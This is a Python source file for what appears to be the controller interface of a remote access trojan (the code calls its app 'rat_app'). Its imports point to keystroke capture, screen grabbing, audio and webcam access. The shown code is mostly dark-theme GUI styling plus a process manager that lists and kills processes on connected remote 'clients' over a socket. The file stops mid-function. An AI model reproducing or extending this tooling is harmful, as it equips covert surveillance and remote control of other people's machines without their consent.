import socket
import threading
import time
import struct
import os
import random
import io
import zlib
import cv2
import numpy as np
import pyaudio
from PIL import ImageGrab, Image
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog, simpledialog
import customtkinter as ctk
from typing import Dict, List, Tuple, Optional
import json
import tempfile
import pynput
import shutil
import uuid
import subprocess
import sys
import matplotlib.dates as mdates
from datetime import datetime
import matplotlib.pyplot as plt
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
from collections import deque
import re
import hashlib
import csv

THEMES = {
    "Dark": {
        "bg_color": "#0F0F0F",           # Almost black background
        "fg_color": "#F5F5F5",           # Crisp white text
        "accent_color": "#00C8FF",       # Bright cyan accent
        "secondary_color": "#1A1A1A",    # Slightly lighter background
        "success_color": "#00E676",      # Vibrant green for success
        "danger_color": "#FF3D00",       # Vibrant orange-red for danger
        "warning_color": "#FFAB00",      # Amber for warnings
        "info_color": "#2979FF",         # Strong blue for information
        "button_color": "#1F1F1F",       # Dark button background
        "card_color": "#141414",         # Very dark for cards
        "hover_color": "#2C2C2C"         # Medium gray for hover states
    }
}

# Add custom fonts
FONT_STYLES = {
    "heading": ("Roboto", 18, "bold"),  # Modern sans-serif font
    "subheading": ("Roboto", 14, "bold"),
    "normal": ("Open Sans", 11),  # Highly readable sans-serif
    "small": ("Open Sans", 9),  # Smaller text for secondary information
    "monospace": ("Fira Code", 11),  # Developer-friendly monospace
    "status": ("Lato", 11, "bold")
}



class ThemeManager:
    """A centralized theme manager for handling theme changes across all widgets."""
    
    def __init__(self, rat_app, themes):
        self.rat_app = rat_app
        self.themes = themes
        self.tracked_widgets = []
        self.tracked_treeviews = []
        self.tracked_notebooks = []
        self.tracked_menu = []
        self.tracked_labels = []
        self.tracked_scrolledtext = []
        
    def track_widget(self, widget, widget_type="regular"):
        """Track a widget for theme updates."""
        if widget is None:
            return
            
        if widget_type == "treeview":
            self.tracked_treeviews.append(widget)
        elif widget_type == "notebook":
            self.tracked_notebooks.append(widget)
        elif widget_type == "menu":
            self.tracked_menu.append(widget)
        elif widget_type == "label":
            self.tracked_labels.append(widget)
        elif widget_type == "scrolledtext":
            self.tracked_scrolledtext.append(widget)
        else:
            self.tracked_widgets.append(widget)
    
    def get_color(self, theme_name, color_key):
        """Get a specific color from the current theme."""
        if theme_name in self.themes and color_key in self.themes[theme_name]:
            return self.themes[theme_name][color_key]
        return None
    
    def apply_theme(self, theme_name):
        """Apply the selected theme to all tracked widgets."""
        
        if theme_name not in self.themes:
            return
            
        theme = self.themes[theme_name]
        
        # Apply theme to the main window and frames
        self.rat_app.root.configure(fg_color=theme["bg_color"])
        
        # Configure ttk styles for notebook - FIXED SECTION
        style = ttk.Style()
        
        # The most important fix - these lines control the notebook background
        style.configure("TNotebook", background=theme["bg_color"])
        style.map("TNotebook", background=[("selected", theme["bg_color"])])
        
        # Configure the tab appearance
        style.configure("TNotebook.Tab", 
                        background=theme["button_color"], 
                        foreground='#000000',
                        padding=[10, 2])
        
        # Configure the tab when selected - Fixed to use proper contrast colors
        style.map("TNotebook.Tab",
                background=[("selected", theme["accent_color"])],
                foreground=[("selected", "#000000")])
                
        # This line also fixes the notebook tab area background
        style.configure("TFrame", background=theme["bg_color"])
                
        # Custom notebook styling
        style.configure("Custom.TNotebook", background=theme["bg_color"])
        style.map("Custom.TNotebook", background=[("selected", theme["bg_color"])])
        style.configure("Custom.TNotebook.Tab", 
                        background=theme["button_color"],
                        foreground='#000000',
                        padding=[10, 2])
        style.map("Custom.TNotebook.Tab",
                background=[("selected", theme["accent_color"])],
                foreground=[("selected", "#000000")])
        
        style.configure("Treeview", 
                    background=theme["card_color"],
                    foreground='#000000',
                    fieldbackground=theme["card_color"],
                    borderwidth=0,
                    highlightthickness=0)
    
        # This is important to make sure selection works properly
        style.map("Treeview",
                background=[("selected", theme["accent_color"])],
                foreground=[("selected", "#000000")])
                
        # Configure treeview heading style
        style.configure("Treeview.Heading",
                        background=theme["button_color"],
                        foreground='#000000',
                        relief="flat")
                        
        # Apply Custom Treeview styles
        style.configure("Custom.Treeview", 
                        background=theme["card_color"],
                        foreground='#000000',
                        fieldbackground=theme["card_color"],
                        borderwidth=0,
                        highlightthickness=0)
        
        style.map("Custom.Treeview",
                background=[("selected", theme["accent_color"])],
                foreground=[("selected", "#000000")])
        
        # Configure the treeview heading style
        style.configure("Custom.Treeview.Heading",
                        background=theme["button_color"],
                        foreground='#000000',
                        relief="flat")
        if theme_name not in self.themes:
            return
        # Apply theme to regular widgets
        for widget in self.tracked_widgets:
            # Check what kind of widget it is and apply appropriate theme attributes
            widget_class = widget.__class__.__name__
            
            if hasattr(widget, "configure"):
                # Common attributes for most widgets
                if hasattr(widget, "fg_color") and "fg_color" in dir(widget):
                    # For CTk widgets like CTkFrame, CTkButton, etc.
                    try:
                        if isinstance(widget, ctk.CTkFrame):
                            # Special handling for frames
                            if "transparent" not in str(widget.cget("fg_color")):
                                widget.configure(fg_color=theme["card_color"])
                        else:
                            # For other widgets
                            widget.configure(fg_color=theme["button_color"])
                    except Exception:
                        pass
                        
                # Text and foreground color
                if hasattr(widget, "text_color") and "text_color" in dir(widget):
                    try:
                        widget.configure(text_color=theme["fg_color"])
                    except Exception:
                        pass
                
                # Button-specific attributes
                if isinstance(widget, ctk.CTkButton):
                    try:
                        # Handle different button types
                        current_color = str(widget.cget("fg_color"))
                        if "danger" in current_color or theme["danger_color"] in current_color:
                            widget.configure(fg_color=theme["danger_color"])
                        elif "success" in current_color or theme["success_color"] in current_color:
                            widget.configure(fg_color=theme["success_color"])
                        elif "accent" in current_color or theme["accent_color"] in current_color:
                            widget.configure(fg_color=theme["accent_color"])
                        else:
                            widget.configure(fg_color=theme["button_color"])
                            
                        widget.configure(hover_color=theme["hover_color"])
                        
                        # Set bg_color if the button has it
                        if hasattr(widget, "bg_color") and "bg_color" in dir(widget):
                            widget.configure(bg_color=theme["bg_color"])
                    except Exception:
                        pass
                        
                # Progress bar specific attributes
                if isinstance(widget, ctk.CTkProgressBar):
                    try:
                        widget.configure(progress_color=theme["accent_color"])
                    except Exception:
                        pass
                        
                # Entry widgets
                if isinstance(widget, ctk.CTkEntry):
                    try:
                        widget.configure(fg_color=theme["bg_color"], 
                                        text_color=theme["fg_color"],
                                        border_color=theme["accent_color"])
                    except Exception:
                        pass
                        
                # CheckBox widgets
                if isinstance(widget, ctk.CTkCheckBox):
                    try:
                        widget.configure(fg_color=theme["accent_color"],
                                        text_color=theme["fg_color"])
                    except Exception:
                        pass
                        
                # TextBox widgets
                if isinstance(widget, ctk.CTkTextbox):
                    try:
                        widget.configure(fg_color=theme["bg_color"],
                                        text_color=theme["fg_color"])
                    except Exception:
                        pass
        
        # Apply theme to treeviews
        style = ttk.Style()
        style.configure("Treeview", 
                        background=theme["card_color"],
                        foreground='#000000',
                        fieldbackground=theme["card_color"])
        
        style.configure("Treeview.Heading",
                        background=theme["button_color"],
                        foreground='#000000')
                        
        style.map("Treeview",
                  background=[("selected", theme["accent_color"])],
                  foreground=[("selected", "#000000")])
                  
        # Configure scrollbars
        style.configure("TScrollbar", 
                        background=theme["card_color"],
                        troughcolor=theme["bg_color"],
                        arrowcolor=theme["fg_color"])
        
        # Apply Custom Treeview styles
        style.configure("Custom.Treeview", 
                        background=theme["card_color"],
                        foreground='#000000',
                        fieldbackground=theme["card_color"])
        
        style.configure("Custom.Treeview.Heading",
                        background=theme["button_color"],
                        foreground='#000000')
                        
        style.map("Custom.Treeview",
                  background=[("selected", theme["accent_color"])],
                  foreground=[("selected", "#000000")])
                  
        # Configure custom scrollbars
        style.configure("Custom.Vertical.TScrollbar", 
                        background=theme["card_color"],
                        troughcolor=theme["bg_color"],
                        arrowcolor=theme["fg_color"])
                        
        style.configure("Custom.Horizontal.TScrollbar", 
                        background=theme["card_color"],
                        troughcolor=theme["bg_color"],
                        arrowcolor=theme["fg_color"])
        
        # Notebook styling - All consolidated in one place for clarity
        style.configure("TNotebook", 
                        background=theme["bg_color"],
                        tabmargins=[2, 5, 2, 0])
                        
        style.configure("TNotebook.Tab", 
                        background=theme["button_color"],
                        foreground='#000000',
                        padding=[10, 2])
                        
        style.map("TNotebook.Tab",
                  background=[("selected", theme["accent_color"])],
                  foreground=[("selected", "#000000")])
                  
        # Custom notebook styling
        style.configure("Custom.TNotebook", 
                        background=theme["bg_color"],
                        tabmargins=[2, 5, 2, 0])
                        
        style.configure("Custom.TNotebook.Tab", 
                        background=theme["button_color"],
                        foreground='#000000',
                        padding=[10, 2])
                        
        style.map("Custom.TNotebook.Tab",
                  background=[("selected", theme["accent_color"])],
                  foreground=[("selected", "#000000")])
        
        # Apply theme to tracked menu items
        for menu in self.tracked_menu:
            try:
                menu.configure(
                    bg=theme["card_color"],
                    fg='#000000',
                    activebackground=theme["hover_color"],
                    activeforeground=theme["fg_color"]
                )
            except Exception:
                pass
        
        # Apply theme to tracked labels
        for label in self.tracked_labels:
            try:
                # Check if it's a tk.Label or CTk label
                if hasattr(label, "configure") and "background" in dir(label):
                    label.configure(
                        background=theme["bg_color"],
                        foreground=theme["fg_color"]
                    )
                elif hasattr(label, "configure") and "text_color" in dir(label):
                    label.configure(text_color=theme["fg_color"])
            except Exception:
                pass
        
        # Update the theme in ProcessManager 
        if hasattr(self.rat_app, 'process_manager'):
            self.rat_app.process_manager.apply_treeview_style()
            
            # Update process manager UI elements
            if hasattr(self.rat_app.process_manager, 'refresh_btn'):
                self.rat_app.process_manager.refresh_btn.configure(
                    fg_color=theme["button_color"],
                    hover_color=theme["hover_color"],
                    bg_color=theme["bg_color"]
                )
                
            if hasattr(self.rat_app.process_manager, 'kill_btn'):
                self.rat_app.process_manager.kill_btn.configure(
                    fg_color=theme["danger_color"],
                    hover_color=theme["hover_color"],
                    bg_color=theme["bg_color"]
                )
                
            # Update CPU and Memory progress bars
            if hasattr(self.rat_app.process_manager, 'cpu_progress'):
                self.rat_app.process_manager.cpu_progress.configure(
                    progress_color=theme["accent_color"]
                )
                
            if hasattr(self.rat_app.process_manager, 'mem_progress'):
                self.rat_app.process_manager.mem_progress.configure(
                    progress_color=theme["info_color"]
                )
                
            # Update context menu
            if hasattr(self.rat_app.process_manager, 'context_menu'):
                self.rat_app.process_manager.context_menu.configure(
                    bg=theme["card_color"],
                    fg=theme["fg_color"],
                    activebackground=theme["hover_color"],
                    activeforeground=theme["fg_color"]
                )
        
        # Update FileTransferSystem UI elements
        if hasattr(self.rat_app, 'file_transfer'):
            # Client card
            if hasattr(self.rat_app.file_transfer, 'client_card'):
                self.rat_app.file_transfer.client_card.configure(
                    fg_color=theme["card_color"]
                )
                
            # Status card
            if hasattr(self.rat_app.file_transfer, 'status_card'):
                self.rat_app.file_transfer.status_card.configure(
                    fg_color=theme["card_color"]
                )
                
            # Progress bar
            if hasattr(self.rat_app.file_transfer, 'progress_bar'):
                self.rat_app.file_transfer.progress_bar.configure(
                    progress_color=theme["accent_color"]
                )
                
            # Cancel button
            if hasattr(self.rat_app.file_transfer, 'cancel_btn'):
                self.rat_app.file_transfer.cancel_btn.configure(
                    fg_color=theme["danger_color"],
                    hover_color=theme["hover_color"]
                )
                
            # Upload button
            if hasattr(self.rat_app.file_transfer, 'upload_btn'):
                self.rat_app.file_transfer.upload_btn.configure(
                    fg_color=theme["button_color"],
                    hover_color=theme["hover_color"]
                )
                
            # Download button
            if hasattr(self.rat_app.file_transfer, 'download_btn'):
                self.rat_app.file_transfer.download_btn.configure(
                    fg_color=theme["button_color"],
                    hover_color=theme["hover_color"]
                )
                
            # Source card
            if hasattr(self.rat_app.file_transfer, 'source_card'):
                self.rat_app.file_transfer.source_card.configure(
                    fg_color=theme["card_color"]
                )
                
            # Destination card
            if hasattr(self.rat_app.file_transfer, 'dest_card'):
                self.rat_app.file_transfer.dest_card.configure(
                    fg_color=theme["card_color"]
                )
                
            # Info card
            if hasattr(self.rat_app.file_transfer, 'info_card'):
                self.rat_app.file_transfer.info_card.configure(
                    fg_color=theme["card_color"]
                )
                
            # Upload info textbox
            if hasattr(self.rat_app.file_transfer, 'upload_info_text'):
                self.rat_app.file_transfer.upload_info_text.configure(
                    fg_color=theme["bg_color"],
                    text_color=theme["fg_color"]
                )
                
                
class ProcessManager:
    def __init__(self, parent, rat_app):
        self.parent = parent
        self.rat_app = rat_app
        self.process_list = []
        self.auto_refresh = False
        self.auto_refresh_interval = 5  # seconds
        self.refresh_thread = None
        self.stop_refresh = False
        
        # Create the UI
        self.setup_ui()
        
    def setup_ui(self):
        # Create process manager tab
        self.process_frame = ctk.CTkFrame(self.parent)
        self.parent.add(self.process_frame, text="Process Manager")
        
        # Get theme colors from theme manager if available
        theme = self.get_theme_colors()
        
        # Top control panel
        control_frame = ctk.CTkFrame(self.process_frame, fg_color=theme["card_color"],
                                     corner_radius=10)
        control_frame.pack(fill=tk.X, padx=15, pady=15)
        
        # Client info display
        client_frame = ctk.CTkFrame(control_frame, fg_color="transparent")
        client_frame.pack(fill=tk.X, pady=10, padx=10)
        
        client_label = ctk.CTkLabel(client_frame, text="Connected Client:", 
                                 font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                 size=FONT_STYLES["subheading"][1], 
                                                 weight=FONT_STYLES["subheading"][2]))
        client_label.pack(side=tk.LEFT, padx=5)
        
        self.client_info_label = ctk.CTkLabel(client_frame, text="None", 
                                          font=ctk.CTkFont(family=FONT_STYLES["normal"][0], size=FONT_STYLES["normal"][1]))
        self.client_info_label.pack(side=tk.LEFT, padx=5)
        
        # Buttons for process operations
        buttons_frame = ctk.CTkFrame(control_frame, fg_color="transparent")
        buttons_frame.pack(fill=tk.X, pady=10, padx=10)
        
        # Refresh button
        self.refresh_btn = ctk.CTkButton(buttons_frame, text="Refresh Processes", 
                                      command=self.refresh_processes, width=150,
                                      fg_color=theme["button_color"],
                                      hover_color=theme["hover_color"],
                                      bg_color=theme["bg_color"],
                                      corner_radius=8)
        self.refresh_btn.pack(side=tk.LEFT, padx=5)
        
        # Kill process button
        self.kill_btn = ctk.CTkButton(buttons_frame, text="Terminate Process", 
                                    command=self.kill_process, width=150,
                                    fg_color=theme["danger_color"],
                                    hover_color=theme["hover_color"],
                                    bg_color=theme["bg_color"],
                                    corner_radius=8)
        self.kill_btn.pack(side=tk.LEFT, padx=5)
        
        # Filter frame
        filter_frame = ctk.CTkFrame(control_frame, fg_color="transparent")
        filter_frame.pack(fill=tk.X, pady=10, padx=10)
        
        filter_label = ctk.CTkLabel(filter_frame, text="Filter:", width=50,
                                  font=ctk.CTkFont(family=FONT_STYLES["normal"][0], size=FONT_STYLES["normal"][1]))
        filter_label.pack(side=tk.LEFT, padx=5)
        
        self.filter_entry = ctk.CTkEntry(filter_frame, corner_radius=8)
        self.filter_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.filter_entry.bind("<KeyRelease>", self.apply_filter)
        
        # Auto-refresh toggle
        self.auto_refresh_var = tk.BooleanVar(value=False)
        auto_refresh_check = ctk.CTkCheckBox(buttons_frame, text="Auto Refresh", 
                                          variable=self.auto_refresh_var,
                                          command=self.toggle_auto_refresh,
                                          checkbox_width=20,
                                          checkbox_height=20,
                                          corner_radius=4,
                                          fg_color=theme["accent_color"])
        auto_refresh_check.pack(side=tk.RIGHT, padx=5)
        
        # System resource usage overview
        resource_frame = ctk.CTkFrame(self.process_frame, fg_color=theme["card_color"],
                                    corner_radius=10)
        resource_frame.pack(fill=tk.X, padx=15, pady=10)
        
        resource_label = ctk.CTkLabel(resource_frame, text="System Resources", 
                                    font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                    size=FONT_STYLES["subheading"][1], 
                                                    weight=FONT_STYLES["subheading"][2]))
        resource_label.pack(anchor="w", padx=15, pady=(10, 5))
        
        resources_container = ctk.CTkFrame(resource_frame, fg_color="transparent")
        resources_container.pack(fill=tk.X, padx=15, pady=(0, 10))
        
        # CPU usage
        cpu_frame = ctk.CTkFrame(resources_container, fg_color="transparent")
        cpu_frame.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5, pady=5)
        
        cpu_label = ctk.CTkLabel(cpu_frame, text="CPU Usage:", 
                               font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                               size=FONT_STYLES["normal"][1], 
                                               weight="bold"))
        cpu_label.pack(side=tk.LEFT, padx=5)
        
        self.cpu_value = ctk.CTkLabel(cpu_frame, text="N/A",
                                   font=ctk.CTkFont(family=FONT_STYLES["normal"][0], size=FONT_STYLES["normal"][1]))
        self.cpu_value.pack(side=tk.LEFT, padx=5)
        
        self.cpu_progress = ctk.CTkProgressBar(cpu_frame, width=150, height=12, corner_radius=6,
                                           progress_color=theme["accent_color"])
        self.cpu_progress.pack(side=tk.LEFT, padx=10)
        self.cpu_progress.set(0)
        
        # Memory usage
        mem_frame = ctk.CTkFrame(resources_container, fg_color="transparent")
        mem_frame.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5, pady=5)
        
        mem_label = ctk.CTkLabel(mem_frame, text="Memory Usage:",
                               font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                               size=FONT_STYLES["normal"][1], 
                                               weight="bold"))
        mem_label.pack(side=tk.LEFT, padx=5)
        
        self.mem_value = ctk.CTkLabel(mem_frame, text="N/A",
                                   font=ctk.CTkFont(family=FONT_STYLES["normal"][0], size=FONT_STYLES["normal"][1]))
        self.mem_value.pack(side=tk.LEFT, padx=5)
        
        self.mem_progress = ctk.CTkProgressBar(mem_frame, width=150, height=12, corner_radius=6,
                                           progress_color=theme["info_color"])
        self.mem_progress.pack(side=tk.LEFT, padx=10)
        self.mem_progress.set(0)
        
        # Create TreeView for process list with a title
        tree_container = ctk.CTkFrame(self.process_frame, fg_color=theme["card_color"],
                                    corner_radius=10)
        tree_container.pack(fill=tk.BOTH, expand=True, padx=15, pady=(10, 15))
        
        tree_title = ctk.CTkLabel(tree_container, text="Process List", 
                               font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                               size=FONT_STYLES["subheading"][1], 
                                               weight=FONT_STYLES["subheading"][2]))
        tree_title.pack(anchor="w", padx=15, pady=(10, 5))
        
        tree_frame = ctk.CTkFrame(tree_container, fg_color="transparent")
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))
        
        # Define columns
        columns = ("PID", "Name", "CPU %", "Memory (MB)", "Status", "User", "Threads")
        self.process_tree = ttk.Treeview(tree_frame, columns=columns, show="headings", style="Custom.Treeview")
        
        # Define headings
        for col in columns:
            self.process_tree.heading(col, text=col, command=lambda _col=col: self.sort_processes_by(_col))
            if col == "Name":
                self.process_tree.column(col, width=200)
            elif col == "User":
                self.process_tree.column(col, width=120)
            else:
                self.process_tree.column(col, width=100)
        
        # Add scrollbars
        y_scrollbar = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.process_tree.yview, style="Custom.Vertical.TScrollbar")
        x_scrollbar = ttk.Scrollbar(tree_frame, orient=tk.HORIZONTAL, command=self.process_tree.xview, style="Custom.Horizontal.TScrollbar")
        self.process_tree.configure(yscroll=y_scrollbar.set, xscroll=x_scrollbar.set)
        
        # Pack components
        y_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        x_scrollbar.pack(side=tk.BOTTOM, fill=tk.X)
        self.process_tree.pack(fill=tk.BOTH, expand=True)
        
        # Context menu
        self.context_menu = tk.Menu(self.process_tree, tearoff=0, bg=theme["card_color"],
                                fg=theme["fg_color"],
                                activebackground=theme["hover_color"],
                                activeforeground=theme["fg_color"])
        self.context_menu.add_command(label="Refresh", command=self.refresh_processes)
        self.context_menu.add_command(label="Terminate Process", command=self.kill_process)
        self.context_menu.add_separator()
        self.context_menu.add_command(label="View Details", command=self.view_process_details)
        
        # Bind events
        self.process_tree.bind("<Button-3>", self.show_context_menu)
        self.process_tree.bind("<Double-1>", lambda e: self.view_process_details())
        
        # Apply theme to treeview
        self.apply_treeview_style()
        
        # Register widgets with ThemeManager if available
        self.register_with_theme_manager()

    def get_theme_colors(self):
        """Get the current theme colors from the rat_app."""
        theme_name = self.rat_app.current_theme
        if hasattr(self.rat_app, 'theme_manager') and self.rat_app.theme_manager is not None:
            return self.rat_app.THEMES[theme_name]
        else:
            return THEMES[theme_name]
            
    def register_with_theme_manager(self):
        """Register widgets with the theme manager if available."""
        if hasattr(self.rat_app, 'theme_manager') and self.rat_app.theme_manager is not None:
            tm = self.rat_app.theme_manager
            
            # Register frames
            tm.track_widget(self.process_frame)
            tm.track_widget(self.tree_container if hasattr(self, 'tree_container') else None)
            tm.track_widget(self.resource_frame if hasattr(self, 'resource_frame') else None)
            tm.track_widget(self.control_frame if hasattr(self, 'control_frame') else None)
            
            # Register buttons
            tm.track_widget(self.refresh_btn)
            tm.track_widget(self.kill_btn)
            
            # Register progress bars
            tm.track_widget(self.cpu_progress)
            tm.track_widget(self.mem_progress)
            
            # Register labels
            tm.track_widget(self.client_info_label, "label")
            tm.track_widget(self.cpu_value, "label")
            tm.track_widget(self.mem_value, "label")
            
            # Register treeview
            tm.track_widget(self.process_tree, "treeview")
            
            # Register menu
            tm.track_widget(self.context_menu, "menu")

    def apply_treeview_style(self):
        style = ttk.Style()
        theme = self.get_theme_colors()
        bg_color = theme["bg_color"]
        fg_color = theme["fg_color"]
        card_color = theme["card_color"]
        hover_color = theme["hover_color"]
        
        # Reset the style first to avoid inheritance issues
        style.layout("Custom.Treeview", [('Custom.Treeview.treearea', {'sticky': 'nswe'})])
        
        # Configure the treeview style
        style.configure("Custom.Treeview", 
                        background=card_color,
                        foreground=theme["fg_color"],
                        fieldbackground=card_color,
                        font=FONT_STYLES["normal"],
                        rowheight=25,
                        borderwidth=0,
                        highlightthickness=0)
        
        # Configure the treeview heading style
        style.configure("Custom.Treeview.Heading",
                        background=theme["button_color"],
                        foreground=theme["bg_color"],
                        font=("Segoe UI", 10, "bold"),
                        relief="flat")
        
        # Configure selection colors - ensure proper background color mapping
        style.map("Custom.Treeview",
                background=[("selected", theme["accent_color"])],
                foreground=[("selected", "#000000")])
        
        # Configure scrollbars
        style.configure("Custom.Vertical.TScrollbar", 
                        background=card_color,
                        troughcolor=bg_color,
                        arrowcolor=fg_color)
        
        style.configure("Custom.Horizontal.TScrollbar", 
                        background=card_color,
                        troughcolor=bg_color,
                        arrowcolor=fg_color)
        
    
    def update_client_info(self):
        """Update the client info when a client is selected"""
        if self.rat_app.current_client_socket:
            for addr, (client_id, conn) in self.rat_app.clients.items():
                if conn == self.rat_app.current_client_socket:
                    self.client_info_label.configure(text=f"{addr[0]}:{addr[1]}")
                    return
        
        self.client_info_label.configure(text="None")
        
    def refresh_processes(self):
        """Request and refresh the process list from the client"""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        try:
            # Clear existing items
            for item in self.process_tree.get_children():
                self.process_tree.delete(item)
            
            # Update client info
            self.update_client_info()
            
            # Send command to client to get process list
            self.rat_app.log("Sending PROCESS_LIST command to client")
            self.rat_app.current_client_socket.send(b'PROCESS_LIST')
            
            # Get response size with improved error handling
            try:
                size_data = self.rat_app.current_client_socket.recv(8)
                if not size_data or len(size_data) != 8:
                    self.rat_app.log(f"Error: Received invalid size data: {size_data}")
                    return
                    
                response_size = struct.unpack('Q', size_data)[0]
                self.rat_app.log(f"Expected response size: {response_size} bytes")
                
                # Receive process list data with proper timeout and error handling
                data = b""
                buffer_size = self.rat_app.BUFFER
                
                while len(data) < response_size:
                    chunk = self.rat_app.current_client_socket.recv(min(response_size - len(data), buffer_size))
                    if not chunk:
                        self.rat_app.log("Connection broken while receiving data")
                        break
                    data += chunk
                    
                if len(data) != response_size:
                    self.rat_app.log(f"Warning: Received {len(data)} bytes instead of expected {response_size} bytes")
                
                # Try to parse the JSON data with better error handling
                try:
                    # Log a small part of the received data for debugging
                    self.rat_app.log(f"First 100 bytes of received data: {data[:100]}")
                    
                    process_data = json.loads(data.decode('utf-8'))
                    
                    # Check for error
                    if isinstance(process_data, str) and process_data.startswith("ERROR:"):
                        self.rat_app.log(process_data)
                        return
                        
                    # Update system resource info
                    if 'system' in process_data:
                        sys_info = process_data['system']
                        self.update_resource_info(sys_info)
                    
                    # Store the full process list
                    self.process_list = process_data['processes']
                    
                    # Display processes
                    self.update_process_tree(self.process_list)
                    
                    self.rat_app.log(f"Retrieved {len(self.process_list)} processes from client")
                    
                except json.JSONDecodeError as e:
                    self.rat_app.log(f"Error decoding JSON: {e}")
                    self.rat_app.log(f"First 100 bytes of received data: {data[:100]}")
                    
            except Exception as inner_e:
                self.rat_app.log(f"Error receiving data: {inner_e}")
                
        except Exception as e:
            self.rat_app.log(f"Error refreshing processes: {e}")
    
    def update_resource_info(self, sys_info):
        """Update system resource information display"""
        try:
            # Update CPU info
            cpu_percent = sys_info.get('cpu_percent', 0)
            self.cpu_value.configure(text=f"{cpu_percent:.1f}%")
            self.cpu_progress.set(cpu_percent / 100)
            
            # Update memory info
            mem_percent = sys_info.get('memory_percent', 0)
            mem_used = sys_info.get('memory_used', 0)
            mem_total = sys_info.get('memory_total', 0)
            
            # Format memory values
            if mem_total > 0:
                mem_used_gb = mem_used / (1024 * 1024 * 1024)
                mem_total_gb = mem_total / (1024 * 1024 * 1024)
                self.mem_value.configure(text=f"{mem_used_gb:.1f} GB / {mem_total_gb:.1f} GB ({mem_percent:.1f}%)")
                self.mem_progress.set(mem_percent / 100)
        except Exception as e:
            self.rat_app.log(f"Error updating resource info: {e}")
    
    def update_process_tree(self, processes):
        """Update the process tree with the given process list"""
        try:
            # Clear existing items
            for item in self.process_tree.get_children():
                self.process_tree.delete(item)
            
            # Apply filter if there is any text in the filter entry
            filter_text = self.filter_entry.get().lower()
            
            # Add processes to treeview
            for process in processes:
                # Apply filter
                if filter_text and filter_text not in process['name'].lower() and filter_text not in str(process['pid']):
                    continue
                
                # Format memory in MB
                memory_mb = process['memory'] / (1024 * 1024) if 'memory' in process else 0
                
                # Insert into treeview
                self.process_tree.insert("", "end", values=(
                    process['pid'],
                    process['name'],
                    f"{process.get('cpu_percent', 0):.1f}",
                    f"{memory_mb:.1f}",
                    process.get('status', 'Unknown'),
                    process.get('username', 'Unknown'),
                    process.get('threads', 0)
                ))
        except Exception as e:
            self.rat_app.log(f"Error updating process tree: {e}")
    
    def apply_filter(self, event=None):
        """Apply filter to the process list"""
        if hasattr(self, 'process_list') and self.process_list:
            self.update_process_tree(self.process_list)
    
    def kill_process(self):
        """Terminate the selected process on the client"""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        selection = self.process_tree.selection()
        if not selection:
            messagebox.showinfo("No Selection", "Please select a process to terminate")
            return
        
        # Get PID from selection
        selected_values = self.process_tree.item(selection[0])["values"]
        pid = selected_values[0]
        process_name = selected_values[1]
        
        # Confirm termination
        if not messagebox.askyesno("Confirm", f"Are you sure you want to terminate '{process_name}' (PID: {pid})?"):
            return
        
        try:
            # Send command to terminate process
            command = f"KILL_PROCESS|{pid}"
            self.rat_app.current_client_socket.send(command.encode())
            
            # Get response
            response = self.rat_app.current_client_socket.recv(1024).decode()
            
            if response.startswith("SUCCESS"):
                self.rat_app.log(f"Successfully terminated process {process_name} (PID: {pid})")
                
                # Refresh process list
                self.refresh_processes()
            else:
                self.rat_app.log(f"Failed to terminate process: {response}")
                messagebox.showerror("Error", f"Failed to terminate process: {response}")
        
        except Exception as e:
            self.rat_app.log(f"Error terminating process: {e}")
            messagebox.showerror("Error", f"Error terminating process: {e}")
    
    def view_process_details(self):
        """Show detailed information for the selected process"""
        if not self.process_list:
            return
        
        selection = self.process_tree.selection()
        if not selection:
            return
        
        # Get PID from selection
        selected_values = self.process_tree.item(selection[0])["values"]
        pid = selected_values[0]
        
        # Find process in list
        process_info = None
        for process in self.process_list:
            if process['pid'] == pid:
                process_info = process
                break
        
        if not process_info:
            messagebox.showinfo("Not Found", "Process information not found")
            return
        
        # Create details dialog
        details_window = ctk.CTkToplevel(self.rat_app.root)
        details_window.title(f"Process Details: {process_info['name']}")
        details_window.geometry("600x400")
        details_window.grab_set()  # Modal dialog
        
        # Get theme colors
        theme = self.get_theme_colors()
        
        # Main frame
        frame = ctk.CTkFrame(details_window, fg_color=theme["bg_color"])
        frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Title
        title = ctk.CTkLabel(frame, text=f"Process: {process_info['name']} (PID: {process_info['pid']})", 
                           font=ctk.CTkFont(size=16, weight="bold"),
                           text_color=theme["fg_color"])
        title.pack(pady=10)
        
        # Process information in a scrollable text area
        details_frame = ctk.CTkFrame(frame, fg_color=theme["card_color"])
        details_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        details_text = ctk.CTkTextbox(details_frame, height=250, 
                                    fg_color=theme["bg_color"],
                                    text_color=theme["fg_color"])
        details_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Add process details
        details_text.insert(tk.END, f"Process ID: {process_info['pid']}\n")
        details_text.insert(tk.END, f"Name: {process_info['name']}\n")
        details_text.insert(tk.END, f"Executable: {process_info.get('exe', 'Unknown')}\n")
        details_text.insert(tk.END, f"Status: {process_info.get('status', 'Unknown')}\n")
        details_text.insert(tk.END, f"User: {process_info.get('username', 'Unknown')}\n")
        details_text.insert(tk.END, f"CPU Usage: {process_info.get('cpu_percent', 0):.2f}%\n")
        
        # Format memory
        memory_mb = process_info.get('memory', 0) / (1024 * 1024)
        details_text.insert(tk.END, f"Memory Usage: {memory_mb:.2f} MB\n")
        
        details_text.insert(tk.END, f"Threads: {process_info.get('threads', 0)}\n")
        details_text.insert(tk.END, f"Created: {process_info.get('create_time', 'Unknown')}\n")
        
        # Command line
